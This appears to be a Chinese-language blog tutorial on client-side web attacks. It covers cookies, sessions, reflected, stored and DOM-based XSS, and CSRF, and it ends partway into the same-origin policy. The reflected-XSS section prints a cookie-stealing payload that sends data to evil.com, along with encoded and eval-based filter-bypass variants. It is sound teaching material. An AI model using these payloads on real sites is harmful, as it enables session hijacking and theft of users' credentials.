@@ -1,0 +1,964 @@
+<!DOCTYPE html>
+<html lang="en-uk" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Client-side Attacks 针对客户端的Web攻击 Prerequisite 要了解针对Web客户端的攻击，我们必须要先了解Session与Cookie的机制 HTTP协议在最初设计的时候是一'><title>Client-side Attacks 针对客户端的Web攻击</title>
+
+<link rel='canonical' href='https://ginkgo.org.cn/posts/client_side_attacks/'>
+
+<link rel="stylesheet" href="/scss/style.min.450926226e724574a6b936335ea06111f8aeb253d932c86cb2cc807341cd2889.css"><meta property='og:title' content='Client-side Attacks 针对客户端的Web攻击'>
+<meta property='og:description' content='Client-side Attacks 针对客户端的Web攻击 Prerequisite 要了解针对Web客户端的攻击，我们必须要先了解Session与Cookie的机制 HTTP协议在最初设计的时候是一'>
+<meta property='og:url' content='https://ginkgo.org.cn/posts/client_side_attacks/'>
+<meta property='og:site_name' content='Under The Ginkgo'>
+<meta property='og:type' content='article'><meta property='article:section' content='Posts' /><meta property='article:tag' content='ctf' /><meta property='article:tag' content='xss' /><meta property='article:published_time' content='2022-05-19T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-05-19T23:52:07&#43;01:00'/>
+<meta name="twitter:title" content="Client-side Attacks 针对客户端的Web攻击">
+<meta name="twitter:description" content="Client-side Attacks 针对客户端的Web攻击 Prerequisite 要了解针对Web客户端的攻击，我们必须要先了解Session与Cookie的机制 HTTP协议在最初设计的时候是一">
+    <link rel="shortcut icon" href="/img/favicon.ico" />
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-ZKEXSTS2N4"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-ZKEXSTS2N4', { 'anonymize_ip': false });
+}
+</script>
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/Ginkgo_hu5438825b9b6d1014226d20d231e650c2_69187_300x0_resize_q75_box.JPG" width="300"
+                            height="237" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🧐</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Under The Ginkgo</a></h1>
+            <h2 class="site-description">BOYS FIGHT FOR YOUR LIBERTY</h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='https://github.com/medic0803'
+                        target="_blank"
+                        title="A_GitHub"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='mailto:medicwrf@gmail.com'
+                        target="_blank"
+                        title="B_E-mail"
+                    >
+                        
+                        
+                            <?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg t="1647773061437" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2742" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"><defs><style type="text/css"></style></defs><path d="M937.593333 257.073333A148.353333 148.353333 0 0 0 832 213.333333H384v-42.666666h85.333333a85.333333 85.333333 0 0 0 0-170.666667H362.666667a21.333333 21.333333 0 0 0-21.333334 21.333333v192H212.26A53.426667 53.426667 0 0 0 160 170.666667h-64a53.393333 53.393333 0 0 0-53.333333 53.333333v533.333333a53.393333 53.393333 0 0 0 53.333333 53.333334h64a53.426667 53.426667 0 0 0 52.26-42.666667H384v192a21.333333 21.333333 0 0 0 21.333333 21.333333h170.666667a21.333333 21.333333 0 0 0 21.333333-21.333333v-192h362.666667a21.333333 21.333333 0 0 0 21.333333-21.333333V362.666667a148.353333 148.353333 0 0 0-43.74-105.593334zM512 85.333333a42.713333 42.713333 0 0 1-42.666667 42.666667H384V42.666667h85.333333a42.713333 42.713333 0 0 1 42.666667 42.666666zM170.666667 757.333333a10.666667 10.666667 0 0 1-10.666667 10.666667h-64a10.666667 10.666667 0 0 1-10.666667-10.666667V224a10.666667 10.666667 0 0 1 10.666667-10.666667h64a10.666667 10.666667 0 0 1 10.666667 10.666667z m384 181.333334H426.666667v-170.666667h128z m384-213.333334H213.333333V256h128v149.333333a21.333333 21.333333 0 0 0 21.333334 21.333334h85.333333a21.333333 21.333333 0 0 0 0-42.666667h-64V256h448c58.813333 0 106.666667 47.853333 106.666667 106.666667z" fill="#bababa" p-id="2743"></path></svg>
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>Dark Mode</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+<main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/ctf/" >
+                CTF
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/posts/client_side_attacks/">Client-side Attacks 针对客户端的Web攻击</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">May 19, 2022</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    11 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="client-side-attacks-针对客户端的web攻击">Client-side Attacks 针对客户端的Web攻击</h2>
+<h3 id="prerequisite">Prerequisite</h3>
+<p>要了解针对Web客户端的攻击，我们必须要先了解Session与Cookie的机制 <!-- raw HTML omitted --></p>
+<p>HTTP协议在最初设计的时候是一个无状态（stateless）的协议，用户在浏览网页的时候发出请求，客户端只是返回页面的内容，不会保留任何关于本次请求的信息，即对用户一无所知。 <!-- raw HTML omitted --></p>
+<p>可是随着Web应用的发展，一些服务要求保存用户的状态，例如网购等就需要用户进行登录后访问自己的专属内容，那么实现状态（state）保存的方式就是 <code>Session</code> 会话，会话的双方就是服务器端以及浏览器的用户端。每次用户发起请求，向服务端请求关于其专属账号的内容的时候，都需要附带上自己专属的信息，比如 credential个人标识符, 添加在购物车的内容。 <!-- raw HTML omitted --></p>
+<p>保存这些内容的方式有： <!-- raw HTML omitted --></p>
+<ol>
+<li>
+<p>保存在本地html中的隐藏内容 (过时) <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">INPUT</span> <span class="na">TYPE</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">NAME</span><span class="o">=</span><span class="s">&#34;sessionid&#34;</span> <span class="na">VALUE</span><span class="o">=</span><span class="s">&#34;7456&#34;</span><span class="p">&gt;</span>
+</span></span></code></pre></div></li>
+<li>
+<p>Cookie (后面展开) <!-- raw HTML omitted --></p>
+</li>
+</ol>
+<p>而向服务器端传递这些信息的手法 <!-- raw HTML omitted --></p>
+<ol>
+<li>
+<p>URL <!-- raw HTML omitted -->
+<a class="link" href="http://www.example.com/page.php?sessionid=7456"  target="_blank" rel="noopener"
+    >http://www.example.com/page.php?sessionid=7456</a> <!-- raw HTML omitted --></p>
+</li>
+<li>
+<p>HTTP header (e.g., cookie) <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">GET /page.php HTTP/1.1 
+</span></span><span class="line"><span class="cl">Host: www.example.com 
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">Cookie: sessionid=7456 
+</span></span><span class="line"><span class="cl">...
+</span></span></code></pre></div></li>
+</ol>
+<p>慢慢的Cooike开始被广泛的使用，但是cookie有大小的限制（maximum size: 4096bytes）,无法存储太多的内容，那么我们为什么不在服务端来存储这些信息呢，这样也更安全，信息也可以更方便的被利用。 <!-- raw HTML omitted --></p>
+<p>那么又多了一个问题，就是服务端存储了这些内容，那么客户端告诉服务端自己需要的是哪一个session的内容呢？这些就需要服务端在开启一个session（例如用户登录的时候）的时候，返回给客户端一个 <code>sessionId</code> ，之后每次客户端发出HTTP请求的时候，都带上这个  <code>sessionId</code> ，服务端就知道了是谁要访问什么信息了，然后当用户登出的时候，就自动删除session的内容节省内存（历史信息存储到数据库中）。 <!-- raw HTML omitted --></p>
+<p>通过以上我们可以稍微总结一下Session与Cookie的特点： <!-- raw HTML omitted --></p>
+<ul>
+<li>Session是存储在服务端的，由sessionId来唯一标识 <!-- raw HTML omitted --></li>
+<li>Cookie是由服务端产生后保存在客户端的简短信息，用在HTTP请求中向服务端展示所拥有的信息 <!-- raw HTML omitted --></li>
+</ul>
+<h4 id="cookie">Cookie</h4>
+<p>接下来，我们再来展开讲讲Cookie的内容 <!-- raw HTML omitted --></p>
+<p>我们再来回顾一下，Cookie与Session最大的区别就是，Cookie是由 <code>服务器端创造</code> 的，存储在 <code>客户端</code> 的信息，如果我们用BurpSuite抓HTTP请求，我们就会发现很多请求都会带上Cookie的内容，这就是客户端通过向服务端展示自己所拥有的（来自服务端分配的）特定cookie，来减少认证的复杂度 <!-- raw HTML omitted --></p>
+<p><figure><img src="/ox-hugo/2022-05-19_10-45-46_screenshot.png" width="700px"/>
+</figure>
+ <!-- raw HTML omitted --></p>
+<p>Cookie通过HTTP header向服务端进行传递，默认情况下是一对键值对，但也可以设置一些额外的信息来增加使用的灵活性 <!-- raw HTML omitted --></p>
+<p><figure><img src="/ox-hugo/2022-05-19_10-46-54_screenshot.png" width="700px"/>
+</figure>
+ <!-- raw HTML omitted --></p>
+<p>我们可以利用浏览器来观察这些存储到浏览器本地的cookie <!-- raw HTML omitted --></p>
+<p><figure><img src="/ox-hugo/2022-05-19_10-50-18_screenshot.png" width="700px"/>
+</figure>
+ <!-- raw HTML omitted --></p>
+<p>服务端则通过HTTP的回复来设置cookie的内容以及其他参数 <!-- raw HTML omitted --></p>
+<p><figure><img src="/ox-hugo/2022-05-19_10-51-35_screenshot.png" width="700px"/>
+</figure>
+ <!-- raw HTML omitted --></p>
+<h3 id="client-side-attacks-goals-针对客户端的攻击的目标">Client-side Attacks Goals 针对客户端的攻击的目标</h3>
+<ol>
+<li>盗取Cookie <!-- raw HTML omitted --></li>
+<li>篡改登录表格 <!-- raw HTML omitted --></li>
+<li>执行额外的HTTP请求 <!-- raw HTML omitted --></li>
+<li>以及任何用HTML以及Javascript做的任何事情！ <!-- raw HTML omitted --></li>
+</ol>
+<h3 id="xss">XSS</h3>
+<p>Cross-Site Scripting 跨站脚本攻击(简写为XSS主要是为了与CSS区分开) 的主要目标就是为了能够在目标页面上执行非法的脚本（JS）代码，“跨站”二字就体现在执行了本不应该出现在这个网站上的脚本代码。 <!-- raw HTML omitted --></p>
+<p>一般来说，造成的原因还是缺乏对于用户输入的检查，进而导致非法的HTML/JS代码注入到页面上，被浏览器解析之后，攻击者就是可以执行任意代码 <!-- raw HTML omitted --></p>
+<p>其具体表现往往就是通过精心设计的一个URL，通过社会工程学的方法诱导用户进行点击，URL中包含了将会植入到页面当中，被浏览器所解析执行的恶意代码。 <!-- raw HTML omitted --></p>
+<p>接着我们来看一看常见的三种XSS攻击 <!-- raw HTML omitted --></p>
+<h4 id="reflected-xss-反射型xss">Reflected XSS 反射型XSS</h4>
+<p>&ldquo;反射&quot;意味着一个用户将不合法的输入先传给服务器，然后服务器再将不合法的javascript代码嵌入HTML中通过HTTP回复再反射给用户，进而浏览器解析执行这些恶意代码，从而造成危害，一般来说，黑客会通过社会工程学的手段来诱导用户点击一个包含恶意代码的链接。 <!-- raw HTML omitted --></p>
+<p>反射型XSS也被称为非持久化XSS，因为其要求用户点击恶意链接才能执行一次 <!-- raw HTML omitted --></p>
+<p>接下来我们来通过一个例子来说明反射型XSS是如何工作并造成损害的： <!-- raw HTML omitted --></p>
+<ol>
+<li>
+<p>服务器上有一个页面的叫做 <code>xss_test.php</code> ，其中有一段代码要求用户输入用户名，输入的用户名会返回到页面上 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">Welcome</span> <span class="o">&lt;?</span><span class="nx">php</span> <span class="k">echo</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;inject&#39;</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div></li>
+<li>
+<p>用户点击了一条恶意修改的网页链接 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://www.example.com/xss_test.php?inject=&lt;script&gt;document.location= &#39;http://evil.com/log.php?&#39;+document.cookie&lt;/script&gt;
+</span></span></code></pre></div><p>我们可以看到这里inject参数被设置为了 <code>script</code> tag的代码来访问攻击者的域名并提供当前网页所拥有的cookie的值 <!-- raw HTML omitted --></p>
+</li>
+<li>
+<p>在用户点击之后，浏览器就会生成HTTP请求向服务器寻求资源，其中就包含了攻击者所包含的恶意代码 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">GET /xss_test.php?inject=%3Cscript%3Edocument.location%3D%27ht tp%3A%2F%2Fevil%2Flog.php%3F%27%2Bdocument.cookie%3C%2Fscript%3E 
+</span></span><span class="line"><span class="cl">Host: www.example.com 
+</span></span><span class="line"><span class="cl">...
+</span></span></code></pre></div></li>
+<li>
+<p>服务端的脚本通过将原本应该为用户名的内容拼接成html返回给用户，然后由浏览器自动解析执行，导致恶意代码被执行，用户的cookie被返回给了攻击者的网站，造成了泄露 <!-- raw HTML omitted --></p>
+</li>
+</ol>
+<p>开发者会利用各种办法来相办法来过滤这些恶意篡改的请求，用户也很容易发现异常的链接，但是攻击者仍然可以用模糊的手法来进行绕过 <!-- raw HTML omitted --></p>
+<p>例如： <!-- raw HTML omitted --></p>
+<ul>
+<li>
+<p>Url encoding: <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://www.example.com/xss_test.php?inject=%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%27%63%69%61%6F%27%29%3B%3C%2F%73%63%72%69%70%74%3E
+</span></span></code></pre></div></li>
+<li>
+<p>不使用 <code>&lt;script&gt;</code> tag： <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://www.example.com/xss_test.php?inject=&lt;img%20onerror=&#34;javascript:%20alert(document.cookie);&#34;%20src=asd&gt;
+</span></span></code></pre></div></li>
+<li>
+<p>动态执行（动态的构建恶意代码的内容） <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://www.example.com/xss_test.php?inject=&lt;script&gt;eval(String.fromCharCode(97,108,101,114,116,40,39,99,105,97,111,39,41,59))&lt;/script&gt;
+</span></span></code></pre></div></li>
+</ul>
+<p>我们甚至可以将包含漏洞的链接通过短网址缩短或者转换为二维码来绕过检测 <!-- raw HTML omitted --></p>
+<h4 id="stored-xss-存储型-xss">Stored XSS 存储型 XSS</h4>
+<p>存储型XSS顾名思义，恶意代码会先被攻击者存储在网页的服务端的数据库当中，当用户访问该网站时，存储的恶意代码会被服务端自动嵌入HTML中，然后由浏览器解析执行，造成危害。 <!-- raw HTML omitted --></p>
+<p>那么这种攻击一般就发生在用户可以获取其他用户进行的输入，常见的就有论坛或者留言板等内容。 <!-- raw HTML omitted --></p>
+<p>存储型XSS与反射型XSS最大的区别就是它是persistent持久的，并且所有能够获取恶意代码内容的用户都会收到影响，同时用户的防备更小，因为网页链接是正常的，而在正常加载中却出现了恶意代码的执行，可谓防不胜防。 <!-- raw HTML omitted --></p>
+<p>总结来说Stored XSS的执行分两步走 <!-- raw HTML omitted --></p>
+<ol>
+<li>Step1 <!-- raw HTML omitted -->
+<ul>
+<li>攻击者上传还有恶意脚本代码的内容到服务器 <!-- raw HTML omitted --></li>
+<li>服务器长期存储这些恶意脚本代码（存储到数据库中） <!-- raw HTML omitted --></li>
+</ul>
+</li>
+<li>Step2 <!-- raw HTML omitted -->
+<ul>
+<li>受害者访问这些有漏洞的网页 <!-- raw HTML omitted --></li>
+<li>服务器从数据库中取出恶意脚本代码嵌入返回给受害者的网页中 <!-- raw HTML omitted --></li>
+<li>继而浏览器自动解析和执行这些恶意脚本代码 <!-- raw HTML omitted --></li>
+</ul>
+</li>
+</ol>
+<h4 id="dom-based-xss">DOM-based XSS</h4>
+<p>在介绍DOM XSS之前，我们需要首先了解一下DOM是什么： <!-- raw HTML omitted --></p>
+<p>DOM(Document object model)文档对象模型，将网页当作一个文档，并用一种树状结构存储网页中的所有的标签，以及其他的信息，并提供了API供JS等脚本语言对页面内容进行查询与修改。我们可以通过浏览器的开发者工具来查看网页的DOM内容。 <!-- raw HTML omitted --></p>
+<p>我们可以看看JS代码调用DOM API的效果，此处的window/document元素就代表着整个网页文档， <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span> <span class="na">onload</span><span class="o">=</span><span class="s">&#34;window.alert(&#39;welcome to my home page!&#39;);&#34;</span><span class="p">&gt;</span>
+</span></span></code></pre></div><p>还可以为网页创建标签，写入内容等信息。 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">html</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="o">&lt;</span><span class="nx">head</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// run this function when the document is loaded
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>       <span class="nb">window</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// create a couple of elements
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// in an otherwise empty HTML page
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>       <span class="nx">heading</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s2">&#34;h1&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">       <span class="nx">heading_text</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createTextNode</span><span class="p">(</span><span class="s2">&#34;Big Head!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">       <span class="nx">heading</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">heading_text</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">       <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">heading</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="o">&lt;</span><span class="err">/head&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="o">&lt;</span><span class="nx">body</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="o">&lt;</span><span class="err">/body&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">/html&gt;</span>
+</span></span></code></pre></div><p>那么我们回到 DOM XSS，其与前面两种XSS的最大的区别就在于，攻击的过程完全只涉及客户端，而不依赖服务器端的返回。 <!-- raw HTML omitted --></p>
+<p>其步骤一般为： <!-- raw HTML omitted --></p>
+<ol>
+<li>攻击者构造一段含有一段直接篡改DOM结构的代码的链接然后发送给受害者 <!-- raw HTML omitted --></li>
+<li>受害者点击链接并向服务器请求网页 <!-- raw HTML omitted --></li>
+<li>服务器端收到请求，但是看不懂也无法执行篡改DOM结构的代码，直接将其与原本合法的网页返回给客户端 <!-- raw HTML omitted --></li>
+<li>客户端解析网页同时发现有修改DOM结构的代码，解析执行，造成危害 <!-- raw HTML omitted --></li>
+</ol>
+<h4 id="xss的危害">XSS的危害</h4>
+<p>BeEF以及各类XSS平台都提供了自动脚本，只需要将组织好的脚本插入，就可以执行自己想要的操作 <!-- raw HTML omitted --></p>
+<p><figure><img src="/ox-hugo/2022-05-19_17-00-28_screenshot.png" width="700px"/>
+</figure>
+ <!-- raw HTML omitted --></p>
+<p><figure><img src="/ox-hugo/2022-05-19_16-19-01_screenshot.png" width="700px"/>
+</figure>
+ <!-- raw HTML omitted --></p>
+<h3 id="csrf">CSRF</h3>
+<p>Cross-Site Request Forgery (CSRF, 读做 &ldquo;sea-surf&rdquo;)，其主要目标是利用用户已经登录的登录凭证（session cookie）来执行一系列越权的操作。 <!-- raw HTML omitted --></p>
+<p>CSRF的主要执行流程为： <!-- raw HTML omitted --></p>
+<ol>
+<li>
+<p>受害者先登录存在漏洞的网站，并且保存session cookie的内容在本地，无需重复登录 <!-- raw HTML omitted --></p>
+</li>
+<li>
+<p>黑客向受害者发送一个恶意网站的链接（链接中只可以包含网址），受害者点击后请求该网页的资源 <!-- raw HTML omitted --></p>
+</li>
+<li>
+<p>这个网页中带有隐藏表格来自动发起POST请求，向存在漏洞的目标网站发送恶意操作的请求（例如修改账号密码） <!-- raw HTML omitted --></p>
+<p>此举能够成功是因为浏览器在发送请求的时候，会自动带上该域名下的所有本地存储的cookie，也就是相当于是本人发出的修改请求 <!-- raw HTML omitted --></p>
+<p>而用户本人可以对次完全不知情 <!-- raw HTML omitted --></p>
+</li>
+</ol>
+<p><figure><img src="/ox-hugo/2022-05-19_21-50-14_screenshot.png" width="700px"/>
+</figure>
+ <!-- raw HTML omitted --></p>
+<p>我们这里可以总结一下CSRF与XSS的区别，我们假设存在漏洞的网站为 <a class="link" href="https://www.vulnerable.com"  target="_blank" rel="noopener"
+    >www.vulnerable.com</a>，黑客构造的网页叫做  <a class="link" href="https://www.malicious.com"  target="_blank" rel="noopener"
+    >www.malicious.com</a> <!-- raw HTML omitted --></p>
+<ul>
+<li>
+<p>在XSS中要完成的目标是，诱导用户点击 <a class="link" href="https://www.vulnerable.com"  target="_blank" rel="noopener"
+    >www.vulnerable.com</a> 的链接（DOM，Reflected需要修改url，Stored则不需要），然后使浏览器在当前页面下执行恶意代码，例如直接盗取cookie <!-- raw HTML omitted --></p>
+</li>
+<li>
+<p>在CSRF中要完成的目标是，诱导用户点击 <a class="link" href="https://www.malicious.com"  target="_blank" rel="noopener"
+    >www.malicious.com</a> 的链接，www.malicious.com的网页内容中会自动地向 <a class="link" href="https://www.vulnerable.com"  target="_blank" rel="noopener"
+    >www.vulnerable.com</a> <!-- raw HTML omitted -->
+发起HTTP请求，同时浏览器会附带上所有域名www.vulnerable.com下的cookie，从而伪装成用户对服务器端造成影响 <!-- raw HTML omitted --></p>
+</li>
+</ul>
+<h3 id="same-origin-policy-浏览器的同源策略">Same-origin policy 浏览器的同源策略</h3>
+<p>看到了上面的例子之后，我想提出一个问题？为什么我们不能直接从第三方网站获取目标网站下的cookie呢？ <!-- raw HTML omitted --></p>
+<p>这里就涉及到了浏览器的同源策略 <!-- raw HTML omitted --></p>
+<p>同源策略的是各个浏览器用于限制不同源的网页直接进行资源交换的行为的一种安全策略 <!-- raw HTML omitted --></p>
